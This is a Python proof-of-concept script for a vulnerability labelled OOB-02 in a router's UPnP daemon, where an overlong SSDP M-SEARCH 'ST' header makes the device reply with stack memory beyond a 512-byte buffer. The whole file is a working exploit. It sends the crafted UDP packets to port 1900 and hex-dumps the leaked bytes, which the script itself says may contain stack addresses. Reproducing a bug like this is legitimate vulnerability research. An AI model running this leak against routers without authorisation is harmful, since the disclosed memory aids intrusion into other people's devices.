#!/usr/bin/env python3
"""
OOB-02 (SSDP M-SEARCH 'ST' over-read) real-router test. Python 3, standard library only.

WHAT IT TESTS
  upnpd answers an SSDP M-SEARCH by building the reply with snprintf() into a
  512-byte stack buffer and then sending as many bytes as snprintf() RETURNED
  (= the length it WANTED to write, not the length it actually wrote). The
  attacker-controlled 'ST:' value is echoed twice in the reply, so a long ST
  makes the wanted length larger than 512, and the router sends bytes that sit
  after the buffer on its own stack.

  Safe router : every reply is at most 511 bytes.
  Affected    : once the ST is long enough, the reply is LONGER than 512 bytes
                and its tail is not text from the reply template.

WHAT IT DOES TO THE ROUTER
  It sends a few ordinary-looking UDP M-SEARCH packets to the router's port
  1900 and reads the replies. It changes no setting and creates no rule.

RUN (on the PC's real LAN, Windows PowerShell is fine; not WSL2-NAT):
  python ssdp01_real_router_test.py                 (router = 192.168.0.1)
  python ssdp01_real_router_test.py 192.168.1.1
"""
import socket
import sys

ROUTER = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"
PORT = 1900
BASE_ST = "upnp:rootdevice"
SUFFIX_LENS = [0, 50, 100, 150, 200, 400, 800, 1200]   # extra bytes after the valid ST prefix
BUF = 512


def msearch(st):
    return ("M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {ROUTER}:{PORT}\r\n"
            'MAN: "ssdp:discover"\r\n'
            "MX: 1\r\n"
            f"ST: {st}\r\n\r\n").encode("latin-1")


def ask(st):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    try:
        s.sendto(msearch(st), (ROUTER, PORT))
        data, _ = s.recvfrom(65535)
        return data
    except socket.timeout:
        return None
    finally:
        s.close()


def printable(b):
    return "".join(chr(c) if 32 <= c < 127 else "." for c in b)


def main():
    print(f"Router {ROUTER}:{PORT}\n")
    print(f"{'ST suffix':>9} {'ST total':>8} {'reply bytes':>11}  verdict")
    print("-" * 60)
    leaked = []
    for n in SUFFIX_LENS:
        st = BASE_ST + "B" * n
        r = ask(st)
        if r is None:
            print(f"{n:>9} {len(st):>8} {'(none)':>11}  no reply (timeout)")
            continue
        verdict = "normal (<= 511 bytes)"
        if len(r) > BUF:
            verdict = f"*** {len(r) - BUF} bytes beyond the 512-byte buffer ***"
            leaked.append((n, r))
        print(f"{n:>9} {len(st):>8} {len(r):>11}  {verdict}")

    print()
    if not leaked:
        print("=== RESULT: no over-long reply. Not reproduced on this router. ===")
        print("If every row says 'no reply', the router did not answer unicast")
        print("M-SEARCH from this PC (UPnP off, or PC not on the router's LAN subnet).")
        return
    print("=== RESULT: reply longer than the 512-byte buffer -> OOB-02 reproduced ===")
    n, r = leaked[-1]
    tail = r[BUF:]
    print(f"Largest case: suffix {n}: reply {len(r)} bytes, {len(tail)} bytes after offset 512.")
    print("First 128 bytes after offset 512 (hex | text), keep this as evidence:")
    for off in range(0, min(128, len(tail)), 16):
        chunk = tail[off:off + 16]
        print(f"  +{BUF + off:4d}  {chunk.hex(' '):<47}  {printable(chunk)}")
    print("\nNote: the tail can contain stale packet bytes and stack addresses from the")
    print("router's memory. Do not post it publicly.")


if __name__ == "__main__":
    main()
